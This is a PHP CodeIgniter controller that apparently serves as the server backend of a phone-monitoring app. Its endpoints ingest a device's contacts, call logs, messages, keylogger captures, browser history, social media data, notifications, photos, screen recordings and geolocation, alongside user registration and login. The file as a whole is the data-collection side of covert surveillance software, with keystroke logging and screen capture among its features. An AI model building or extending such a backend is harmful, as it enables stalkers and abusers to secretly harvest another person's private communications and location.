<?php
class Api extends MY_Controller{
    
    public function __construct() {
        parent::__construct();
        $this->load->model('api_model','this_model');
    }
    
    /* User registration */
    
    function user_register(){
        $result = $this->this_model->singup($this->input->post());
        echo json_encode(array('responsedata' => $result));
    }
    
    /* User login */
    
    function user_login(){
        $result = $this->this_model->login($this->input->post());
        echo json_encode(array('responsedata' => $result));
    }
    
    /* Import Application */
    
    function application(){
        $result = $this->this_model->userApplication($this->input->post());
        echo json_encode(array('responsedata' => $result));
    }
    
    /* Application List */
    
    function application_list(){
        $result = $this->this_model->userApplicationList($this->input->post());
        echo json_encode(array('responsedata' => $result));
    }
            
    /* Import Contact */
    
    function contact_import(){
        $data = data();
        $result = $this->this_model->contact_import($data);
        echo json_encode(array('responsedata' => $result));
    }
    
    /*  Contact List */
    
    function contact_list(){
        $result = $this->this_model->contact_list($this->input->post());
        echo json_encode(array('responsedata' => $result));
    }
    
    /*  Contact Edit */
    
    function contact_edit(){
        $data = data();
        $result = $this->this_model->contact_edit($data);
        echo json_encode(array('responsedata' => $result));
    }
    
    /*  Import call logs */
    
    function call_import(){
        $data = data();
        $result = $this->this_model->addCallList($data);
        echo json_encode(array('responsedata' => $result));
    }
    
    /*  Import Message */
    
    function message_import(){
        $data = data();
        $result = $this->this_model->addMessageList($data);
        echo json_encode(array('responsedata' => $result));
    }
    
    /*  Import Key Logger */
    
    function key_logger_import(){
        $data = data();
        $result = $this->this_model->addKeyLogger($data);
        echo json_encode(array('responsedata' => $result));
    }
    
    /*  Import Browser history */

    function browser_history_import(){
        $data = data();
        $result = $this->this_model->addBrowserHistory($data);
        echo json_encode(array('responsedata' => $result));
    }
    
    /*  Import Socail Medai */
    
    function social_medai_import(){
        $data = data();
        $result = $this->this_model->addSocialMedia($data);
        echo json_encode(array('responsedata' => $result));
    }
    
    /*  Import Notification */
    
    function notification_import(){
        $data = data();
        $result = $this->this_model->addNotification($data);
        echo json_encode(array('responsedata' => $result));
    }
    
    /* Import Gallary & Screen Photo Where G : Gallary Pic & SP : Screen Photo*/
    
    function gallary(){
        $result = $this->this_model->addGallary($this->input->post());
        echo json_encode(array('responsedata' => $result));
    }
    
    /* Import Video & Screen Video V : Video & SV : Screen Video*/
    
    function video(){
        $result = $this->this_model->addVideo($this->input->post());
        echo json_encode(array('responsedata' => $result));
    }
    
    /*Geo Location*/
    
    function geo_location(){
        $data = data();
        $result = $this->this_model->geoLocation($data);
        echo json_encode(array('responsedata' => $result));
    }
    
    /*Device update*/
    
    function device_update(){
        $result = $this->this_model->deviceUpdate($this->input->post());
        echo json_encode(array('responsedata' => $result));
    }
    
}